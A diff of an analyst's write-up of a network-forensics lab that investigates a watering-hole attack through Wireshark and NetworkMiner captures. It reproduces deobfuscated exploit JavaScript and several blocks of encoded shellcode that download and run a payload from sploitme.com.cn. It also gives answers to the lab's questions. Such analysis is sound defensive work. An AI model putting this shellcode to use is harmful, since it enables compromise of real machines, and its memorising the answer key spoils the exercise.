@@ -58,10 +58,12 @@ As a soc analyst, analyze the artifacts and answer the questions.
 `->` Tool used for this: ***NetworkMiner***
 
 First Router/WAP : `10.0.2.2`
+
 ![](/assets/img/Pasted image 20240808235953.png)
 
 
 Host `10.0.2.15` in this network:
+
 ![](/assets/img/Pasted image 20240809000122.png)
 
 	- Host has a Windows OS
@@ -69,38 +71,47 @@ Host `10.0.2.15` in this network:
 
 
 Second Router/WAP: `10.0.3.2`
+
 ![](/assets/img/Pasted image 20240809000430.png)
 
 
 Host `10.0.3.15` in this network:
+
 ![](/assets/img/Pasted image 20240809000546.png)
 
 
 Third router/WAP: `10.0.4.2`
+
 ![](/assets/img/Pasted image 20240809000658.png)
 
 
 Host `10.0.4.15` in this network:
+
 ![](/assets/img/Pasted image 20240809000728.png)
 
 
 Fourth router/WAP:
+
 ![](/assets/img/Pasted image 20240809000815.png)
 
 
 Host `10.0.5.15` in this network:
+
 ![](/assets/img/Pasted image 20240809000917.png)
 
 
 Users `10.0.3.15`, and `10.0.4.15` interacting with the honeypot:
+
 ![](/assets/img/Pasted image 20240809001030.png)
 
 
 Gateway for the malicious website:
+
 ![](/assets/img/Pasted image 20240809001150.png)
 
 
 Malicious website used for watering hole attacks: `192.168.56.50`
+
 ![](/assets/img/Pasted image 20240809001434.png)
 
 	- Hostname: rapidshare.com.eyu32.ru
@@ -108,21 +119,26 @@ Malicious website used for watering hole attacks: `192.168.56.50`
 
 
 Actual malware website used for dissemination:
+
 ![](/assets/img/Pasted image 20240809001600.png)
 
 
 Website for the honeypot:
+
 ![](/assets/img/Pasted image 20240809001729.png)
 
 
 Google servers used for redirection:
+
 ![](/assets/img/Pasted image 20240809002006.png)
 
 
 
 ## Network Context:
 
+
 <u>Protocols</u>:
+
 ![](/assets/img/Pasted image 20240807155051.png)
 
 ```c
@@ -145,18 +161,22 @@ ARP
 <u>Communicating endpoints</u>:
 
 ###### Ethernet:
+
 ![](/assets/img/Pasted image 20240807155310.png)
 
 
 ###### IPv4:
+
 ![](/assets/img/Pasted image 20240807155224.png)
 
 
 ###### TCP:
+
 ![](/assets/img/Pasted image 20240807155333.png)
 
 
 ###### UDP:
+
 ![](/assets/img/Pasted image 20240807155401.png)
 
 
@@ -166,6 +186,7 @@ ARP
 ## `Q1` Multiple systems were targeted. Provide the IP address of the highest one.
 
 <u>Presumed attackers</u>:
+
 ```c
 - 10.0.2.15
 - 10.0.3.15
@@ -185,6 +206,7 @@ ARP
 ![](/assets/img/Pasted image 20240807161410.png)
 
 Following the `HTTP` stream:
+
 ![](/assets/img/Pasted image 20240807161600.png)
 
 -> Answer: `http`
@@ -193,11 +215,14 @@ Following the `HTTP` stream:
 ## `Q3` What was the URL for the page used to serve malicious executables (don't include URL parameters)?
 
 Checking all websites requested in the `pcap`:
+
 ![](/assets/img/Pasted image 20240807162334.png)
+
 ![](/assets/img/Pasted image 20240807162349.png)
 
 
 Websites that are more likely to be a malware site:
+
 ```c
 - sploitme.com.cn
 - rapidshare[.]com[.]eyu32[.]ru
@@ -205,14 +230,17 @@ Websites that are more likely to be a malware site:
 
 
 <u>Downloaded files captured</u>:
+
 ![](/assets/img/Pasted image 20240807162630.png)
 
 
 Finding packet streams for `sploitme` website: Instance that the malware is being downloaded
+
 ![](/assets/img/Pasted image 20240807163448.png)
 
 
 Other files on `Export Object`:
+
 ![](/assets/img/Pasted image 20240807170916.png)
 
 -> Answer: `http://sploitme.com.cn/fg/load.php`
@@ -221,16 +249,19 @@ Other files on `Export Object`:
 ## `Q4` What is the number of the packet that includes a redirect to the french version of Google and probably is an indicator for Geo-based targeting?
 
 DNS request to the french version of google:
+
 ![](/assets/img/Pasted image 20240807165649.png)
 
 
 Redirected request:
+
 ![](/assets/img/Pasted image 20240807170538.png)
 
 	- Once the compromised system figured out that the google IP wasn't a French-based, it cancels the connection and acquire the IP for google.fr next.
 
 
 Normal request to the french version of google:
+
 ![](/assets/img/Pasted image 20240807165855.png)
 
 	- Notice in here that the compromised system 10.0.3.15 tried to connect to 209.85.227.99 and it was successful.
@@ -241,12 +272,14 @@ Normal request to the french version of google:
 ## `Q5` What was the CMS used to generate the page '`shop.honeynet.sg/catalog/`'? (Three words, space in between)
 
 Checking all types of connections:
+
 ![](/assets/img/Pasted image 20240808225909.png)
 
 	- Could not find anything
 
 
 Wireshark query:
+
 ```c
 http.response.code == 200
 ```
@@ -257,11 +290,13 @@ http.response.code == 200
 ![](/assets/img/Pasted image 20240808231557.png)
 
 - The `banner` should be an indicator of what the `Content Management System (CMS)` is:
+- 
 ```c
 oscommerce -> good keyword!
 ```
 
 - Looking it up at Google:
+- 
 ```c
 osCommerce banner cms
 ```
@@ -276,6 +311,7 @@ osCommerce banner cms
 ## `Q6` What is the number of the packet that indicates that '`show.php`' will not try to infect the same host twice?
 
 Search up the keyword:
+
 ![](/assets/img/Pasted image 20240807182309.png)
 
 	- Nope, that's not it.
@@ -286,35 +322,47 @@ Search up the keyword:
 ![](/assets/img/Pasted image 20240808232603.png)
 
 Victim machine clicked on something inside the website:
+
 ![](/assets/img/Pasted image 20240808233152.png)
 
 
 First, let's narrow it down to the packets that shows the infection on the machine:
+
 ![](/assets/img/Pasted image 20240808232809.png)
 
+
 Following the stream:
+
 ![](/assets/img/Pasted image 20240808232850.png)
 
 	- Started when the user clicked something in the website causing to execute a Javascript code.
+
 
 ![](/assets/img/Pasted image 20240808232944.png)
 
 	- There's an encoded javascript which is most likely for downloading the malware on the victim machine by forcing it to have a GET request to /fg/load.php?e=1
 
+
 ![](/assets/img/Pasted image 20240808233017.png)
 
+
 - Notice in this one, it uses Internet Explorer on the infected host and then downloads the malware.
+
 ![](/assets/img/Pasted image 20240807182244.png)
 
 
 Now, let's check the packets/stream to which it doesn't reinfect the same machine:
+
 ![](/assets/img/Pasted image 20240808232246.png)
 
+
 Following the stream for this request URI:
+
 ![](/assets/img/Pasted image 20240808232318.png)
 
 
 Here's the specific packet for it:
+
 ![](/assets/img/Pasted image 20240809093256.png)
 
 	- This one does not have the javascript shellcode to be sent to the victim's machine.
@@ -325,6 +373,7 @@ Here's the specific packet for it:
 ## `Q7` One of the exploits being served targets a vulnerability in "`msdds.dll`". Provide the corresponding CVE number.
 
 ##### Tools used for this question:
+
 ```c
 - Wireshark
 - Spidermonkey
@@ -332,50 +381,61 @@ Here's the specific packet for it:
 
 
 Wireshark Query for isolating the packets for the malware distribution:
+
 ```c
 http.request.uri contains "/fg/load.php"
 ```
 
 Output 1:
+
 ![](/assets/img/Pasted image 20240809125710.png)
 
 Another wireshark query:
+
 ```c
 http.request.uri contains "/fg/show"
 ```
 
 Output 2:
+
 ![](/assets/img/Pasted image 20240809125658.png)
 
 **Note**: For the output on both wireshark queries that includes malicious javascript, document and deobfuscate all of the malicious javascript found.
 
 
 Going to NetworkMiner to extract the Javascript clicked by users when they got infected:
+
 ![](/assets/img/Pasted image 20240809094320.png)
 
 	- We want to find the packets related to this clicks since this is related to the Javascript code we're trying to find.
 
 
 ###### From packet `178`:
+
 Packets for the first Javascript:
+
 ![](/assets/img/Pasted image 20240809094533.png)
 
 Here's the stream for `/fg/show.php?s=3feb5a6b2f`:
+
 ![](/assets/img/Pasted image 20240809094630.png)
 
 	- I highlighted the javascript we can use Spidermonkey with and saved it on notepad++
 
 
 Another stream for `/fg/show.php?s=84c090bd86`:
+
 ![](/assets/img/Pasted image 20240809112041.png)
 
 ![](/assets/img/Pasted image 20240809112058.png)
 
 
 - ***What we want is to analyze the obfuscated Javascript code and how we can relate it to `msdds.dll`!***
+
 -> Link for documentation: `blog.didierstevens.com/2018/04/19/update-patched-spidermonkey/`
 
 Important flags to remember:
+
 ```c
 'a' : ASCII/HEX dump
 'x' : HEX dump
@@ -389,6 +449,7 @@ Important flags to remember:
 
 
 How to use them:
+
 ```c
 C:\Demo>js-ascii.exe
 js> eval(unescape('%<hex1>%<hex2>%<hex3>%<hex-n>'));
@@ -398,6 +459,7 @@ js> eval(unescape('%<hex1>%<hex2>%<hex3>%<hex-n>'));
 
 
 How to use with the flag:
+
 ```c
 C:\Demo>js-ascii.exe
 js> document.output('x'); // flag used just before JavaScript evaluation
@@ -409,9 +471,11 @@ js> eval(unescape('%<hex1>%<hex2>%<hex3>%<hex-n>'));
 
 
 Isolating the malicious `javascript` code from Wireshark to Notepad++:
+
 ![](/assets/img/Pasted image 20240809124241.png)
 
 Example command:
+
 ```c
 C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>type jscode1.js | js-ascii.exe -
 ```
@@ -420,14 +484,17 @@ C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>type jscode1.js | js-asc
 
 
 Output:
+
 ![](/assets/img/Pasted image 20240809130128.png)
 
 A more readable format:
+
 ![](/assets/img/Pasted image 20240809130217.png)
 
 	- Doesn't have a malicious JavaScript code.
 
 Since most malicious files are in a zip file (presumed good practice), we can use something like `zipdump.py` tool from Steven Didier's toolsuite to dump the malicious Javascript file:
+
 ```c
 C:\Demo>zipdump.py -d demo.js.zip
 <obfuscated-javascript-code-should-be-here>
@@ -439,29 +506,37 @@ C:\Demo>zipdump.py -d demo.js.zip | js-ascii.exe -
 
 
 Another way to execute `Spidermonkey` and modifying its output as stated above to either hex dump or ascii (or both!), is by doing this:
+
 ```c
 C:\Demo>type jscode1.js | js-ascii.exe -e "document.output('a')" -
 ```
 
 
 ###### From packet `174`:
+
 Command:
+
 ```c
 C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>type jscode2.js | js-ascii.exe -
 ```
 
 Output in cmd terminal:
+
 ![](/assets/img/Pasted image 20240809130810.png)
 
 Modifying the output type:
+
 ```c
 C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>type jscode2.js | js-ascii.exe -e "document.output('D')" -
 ```
 
 Output:
+
 ![](/assets/img/Pasted image 20240809131726.png)
 
+
 JavaScript code:
+
 ```c
 function Complete(){setTimeout('location.href = "about:blank',2000);}
 
@@ -491,12 +566,6 @@ mdac();
 ```
 
 
-<u>Code breakdown</u>:
-```c
-
-```
-
-
 <u>Functions found</u>:
 ```c
 - Complete()
@@ -507,23 +576,32 @@ mdac();
 
 
 ###### From packet `502`:  URI request -> `/fg/load.php?e=1`
+
 ![](/assets/img/Pasted image 20240809132057.png)
 
+
 Following the HTTP stream:
+
 ![](/assets/img/Pasted image 20240809132123.png)
 
 Isolating the malicious javascript code found in the stream:
+
 ![](/assets/img/Pasted image 20240809132029.png)
 
+
 Command:
+
 ```c
 C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>type jscode3.js | js-ascii.exe -e "document.output('D')" -
 ```
 
 Output:
+
 ![](/assets/img/Pasted image 20240809132500.png)
 
+
 JavaScript code:
+
 ```c
 function Complete(){
 	setTimeout('location.href = "about:blank',2000);
@@ -822,13 +900,8 @@ mdac();
 ```
 
 
-<u>Code breakdown</u>:
-```c
-
-```
-
-
 <u>Functions Found</u>:
+
 ```c
 - Complete()
 - CreateO
@@ -847,26 +920,34 @@ mdac();
 
 
 Packets for the 2nd stage malware downloaded with this exploit and 1st stager:
+
 ![](/assets/img/Pasted image 20240809161821.png)
+
 
 ##### Question: How can I know that one of the function in here is an exploit? (and could be connected to `msdds.dll`?)
 
 
 ### Finding other possible malicious JavaScript: Found one at `packet 314`
+
 Wireshark query:
+
 ```c
 - "<script>" string keyword // Packet Details -> Narrow & Wide -> String -> Uncheck 'Case sensitive' box
 - From here, found the packet 314.
 ```
 
+
 Following the stream:
+
 ![](/assets/img/Pasted image 20240809145615.png)
 
 JavaScript Code saved at Notepad++:
+
 ![](/assets/img/Pasted image 20240809145854.png)
 
 
 JavaScript code:
+
 ```c
 <!doctype html>
 <html>
@@ -954,31 +1035,28 @@ function a(){google.timers.load.t.ol=(new Date).getTime();google.report&&google.
 	- There's only this JavaScript from the rest of the packets.
 
 
-<u>Code breakdown</u>:
-```c
-
-```
-
-
-
-
 ### Extracting the Shellcode on `aolwinamp()` function:
 
 Here's the shellcode:
+
 ```c
 %uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u333D
 ```
 
 
 Command 1:
+
 ```c
 C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>scdbg.exe /f aolwinamp-shellcode
 ```
 
 Output:
+
 ![](/assets/img/Pasted image 20240809134730.png)
 
+
 Functions found in the shellcode analysis:
+
 ```c
 401086  GetTempPathA(len=88, buf=12fd80) = 22
 4010b0  LoadLibraryA(urlmon.dll)
@@ -989,14 +1067,18 @@ Functions found in the shellcode analysis:
 
 
 DLL dependencies:
-Command->
+
+Command:
+
 ```c
 scdbg.exe /dllmap aolwinamp-shellcode
 ```
 
 ![](/assets/img/Pasted image 20240809143549.png)
 
+
 List of DLLs:
+
 ```c
 kernel32 Dll mapped at 7c800000 - 7c8f6000  Version: 5.1.2600.5781
 ntdll    Dll mapped at 7c900000 - 7c9b2000  Version: 5.1.2600.5755
@@ -1019,22 +1101,26 @@ winhttp  Dll mapped at 4d4f0000 - 4d549000  Version: 5.1.2600.6175
 ### Extracting the Shellcode on `directshow()` function:
 
 Here's the shellcode:
+
 ```c
 %uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u343D
 ```
 
 
 Command 2:
+
 ```c
 C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>scdbg.exe /f directshow-shellcode
 ```
 
 
 Output:
+
 ![](/assets/img/Pasted image 20240809135552.png)
 
 
 Functions found in the shellcode analysis:
+
 ```c
 401086  GetTempPathA(len=88, buf=12fd80) = 22
 4010b0  LoadLibraryA(urlmon.dll)
@@ -1045,6 +1131,7 @@ Functions found in the shellcode analysis:
 
 
 DLL dependencies:
+
 Command->
 ```c
 scdbg.exe /dllmap directshow-shellcode
@@ -1052,7 +1139,9 @@ scdbg.exe /dllmap directshow-shellcode
 
 ![](/assets/img/Pasted image 20240809143808.png)
 
+
 List of DLLs:
+
 ```c
 kernel32 Dll mapped at 7c800000 - 7c8f6000  Version: 5.1.2600.5781
 ntdll    Dll mapped at 7c900000 - 7c9b2000  Version: 5.1.2600.5755
@@ -1078,22 +1167,26 @@ winhttp  Dll mapped at 4d4f0000 - 4d549000  Version: 5.1.2600.6175
 
 
 Here's the shellcode:
+
 ```c
 %uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u373D
 ```
 
 
 Command 3:
+
 ```c
 C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>scdbg.exe /f com-shellcode
 ```
 
 
 Output:
+
 ![](/assets/img/Pasted image 20240809140110.png)
 
 
 Functions found in the shellcode analysis:
+
 ```c
 401086  GetTempPathA(len=88, buf=12fd80) = 22
 4010b0  LoadLibraryA(urlmon.dll)
@@ -1105,6 +1198,7 @@ Functions found in the shellcode analysis:
 
 DLL dependencies:
 Command->
+
 ```c
 scdbg.exe /dllmap com-shellcode
 ```
@@ -1112,6 +1206,7 @@ scdbg.exe /dllmap com-shellcode
 ![](/assets/img/Pasted image 20240809144211.png)
 
 List of DLLs:
+
 ```c
 kernel32 Dll mapped at 7c800000 - 7c8f6000  Version: 5.1.2600.5781
 ntdll    Dll mapped at 7c900000 - 7c9b2000  Version: 5.1.2600.5755
@@ -1134,22 +1229,26 @@ winhttp  Dll mapped at 4d4f0000 - 4d549000  Version: 5.1.2600.6175
 ### Extracting the Shellcode on `spreadsheet()` function:
 
 Here's the shellcode:
+
 ```c
 %uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u732F%u6C70%u696F%u6D74%u2E65%u6F63%u2E6D%u6E63%u662F%u2F67%u6F6C%u6461%u702E%u7068%u653F%u383D
 ```
 
 
 Command 4:
+
 ```c
 C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>scdbg.exe /f spreadsheet-shellcode
 ```
 
 
 Output:
+
 ![](/assets/img/Pasted image 20240809143335.png)
 
 
 Functions found in the shellcode analysis:
+
 ```c
 401086  GetTempPathA(len=88, buf=12fd80) = 22
 4010b0  LoadLibraryA(urlmon.dll)
@@ -1160,14 +1259,18 @@ Functions found in the shellcode analysis:
 
 
 DLL dependencies:
+
 Command->
+
 ```c
 scdbg.exe /dllmap com-shellcode
 ```
 
 ![](/assets/img/Pasted image 20240809144313.png)
 
+
 List of DLLs:
+
 ```c
 kernel32 Dll mapped at 7c800000 - 7c8f6000  Version: 5.1.2600.5781
 ntdll    Dll mapped at 7c900000 - 7c9b2000  Version: 5.1.2600.5755
@@ -1190,14 +1293,18 @@ winhttp  Dll mapped at 4d4f0000 - 4d549000  Version: 5.1.2600.6175
 ### Finding other possible malicious JavaScript: Found one at `packet 714`
 
 Command:
+
 ```c
 type jscode4.js | js-ascii.exe -e "document.output('D')" -
 ```
 
 Output:
+
 ![](/assets/img/Pasted image 20240809152658.png)
 
+
 JavaScript code:
+
 ```c
 function Complete(){setTimeout('location.href = "about:blank',2000);}
 function CheckIP(){var req=null;try{req=new ActiveXObject("Msxml2.XMLHTTP");}catch(e){try{req=new ActiveXObject("Microsoft.XMLHTTP");}catch(e){try{req=new XMLHttpRequest();}catch(e){}}}
@@ -1214,6 +1321,7 @@ Complete();
 
 
 <u>JavaScript code</u>:
+
 ```c
 <script type="text/javascript">
 
@@ -1239,16 +1347,20 @@ eval(function(p,a,c,k,e,r){
 
 
 Possible shellcode: (`pckt28-shellcode`)
+
 ```c
 %h%0%6%d%e%7%1%8%9%d%3%4%a%5%2%2%i%j%b%b%9%i%c%k%0%2%7%1%l%3%k%7%l%3%m%b%t%3%c%0%3%u%4%v%6%1%f%w%e%x%f%y%6%a%z%0%g%2%5%4%n%8%5%1%0%A%5%2%4%n%8%9%2%o%c%1%4%a%B%0%9%0%f%0%c%0%2%o%j%8%5%0%g%g%1%m%a%p%h%b%0%6%d%e%7%1%p%C
 ```
 
 Command 5:
+
 ```c
 C:\Users\husky\Desktop\CCD_NetworkForensicsLabs\Windows>scdbg.exe /f pckt28-shellcode
 ```
 
+
 Output:
+
 ![](/assets/img/Pasted image 20240809162654.png)
 
 	- Its not a shellcode.
@@ -1263,7 +1375,9 @@ Output:
 ### Possible malicious JS script found at `Packet 415`
 
 Wireshark Stream:
+
 ![](/assets/img/Pasted image 20240809165318.png)
+
 
 JS code:
 ```c
@@ -1292,16 +1406,19 @@ document.write(m);
 ## `Q8` What is the name of the executable being served via `'http://sploitme.com.cn/fg/load.php?e=8'` ?
 
 Using Wireshark:
+
 ![](/assets/img/Pasted image 20240808233849.png)
 
 	- There's nothing
 
 
 There isn't any either using `NetworkMiner`:
+
 ![](/assets/img/Pasted image 20240808233943.png)
 
 
 It's not in `Brim` either:
+
 ![](/assets/img/Pasted image 20240808234110.png)
 
 
@@ -1314,22 +1431,27 @@ http.request.uri contains "s="
 
 ![](/assets/img/Pasted image 20240808234333.png)
 
+
 Following the stream:
+
 ![](/assets/img/Pasted image 20240808234446.png)
 
 	- Is there some way for us to decode this obfuscated Javascript code?
 
 
 Another blob of obfuscated Javascript code:
+
 ![](/assets/img/Pasted image 20240808234707.png)
 
 - See "***Extracting the Shellcode on `spreadsheet()` function***" from the above question.
 
 -> Answer: `e.exe`
 
+
 ## `Q9` One of the malicious files was first submitted for analysis on VirusTotal at `2010-02-17 11:02:35` and has an MD5 hash ending with '`78873f791`'. Provide the full MD5 hash.
 
 Powershell script created to extract MD5 hashes from reconstructed files from NetworkMiner: (Located at `C:\Users\husky\Documents` from PMAT VM)
+
 ```c
 param(
     [string]$DirectoryPath,
@@ -1387,6 +1509,7 @@ $fileHashes | Out-File -FilePath $OutputFilePath -Encoding utf8
 Write-Host "MD5 hashes have been written to $OutputFilePath"
 ```
 
+
 How to execute PowerShell script:
 ```c
 PS C:\Users\husky\Documents> ./files-md5-hash.ps1 -DirectoryPath "C:\Users\husky\Desktop\NetworkMiner_2-9\AssembledFiles\192.168.56.52\TCP-80\fg" -OutputFilePath ./md5hashes.txt
@@ -1394,9 +1517,12 @@ MD5 hashes have been written to ./md5hashes.txt
 ```
 
 Output:
+
 ![](/assets/img/Pasted image 20240809173444.png)
 
+
 VirusTotal Link:
+
 ```c
 virustotal.com/gui/file/<sha256>
 ```
@@ -1406,11 +1532,14 @@ virustotal.com/gui/file/<sha256>
 
 -> Answer: `52312BB96CE72F230F0350E78873F791`
 
+
 ## `Q10` What is the name of the function that hosted the shellcode relevant to '`http://sploitme.com.cn/fg/load.php?e=3`'?
+
 
 ![](/assets/img/Pasted image 20240809174031.png)
 
 -> Answer: `aolwinamp`
+
 
 ## `Q11` Deobfuscate the JS at '`shop.honeynet.sg/catalog/`' and provide the value of the '`click`' parameter in the resulted URL.
 
@@ -1420,6 +1549,7 @@ virustotal.com/gui/file/<sha256>
 
 -> Answer: `84c090bd86`
 
+
 ## `Q12` Deobfuscate the JS at '`rapidshare.com.eyu32.ru/login.php`' and provide the value of the '`click`' parameter in the resulted URL.
 
 - See deobfuscation on around `packet 41`.
@@ -1428,11 +1558,13 @@ virustotal.com/gui/file/<sha256>
 
 -> Answer: `3feb5a6b2f`
 
+
 ## `Q13` What was the version of '`mingw-gcc`' that compiled the malware?
 
 ![](/assets/img/Pasted image 20240807183359.png)
 
 -> Answer: `3.4.5`
+
 
 ## `Q14` The shellcode used a native function inside '`urlmon.dll`' to download files from the internet to the compromised host. What is the name of the function?
 
